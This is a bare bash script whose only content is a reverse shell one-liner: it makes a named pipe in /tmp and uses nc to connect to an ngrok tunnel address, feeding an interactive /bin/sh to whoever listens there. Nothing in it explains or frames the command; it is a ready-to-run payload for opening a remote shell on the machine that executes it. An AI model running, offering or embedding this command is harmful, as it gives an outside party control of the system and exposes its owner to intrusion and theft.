#!/bin/bash


mkfifo /tmp/lol;nc 0.tcp.in.ngrok.io 15633 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
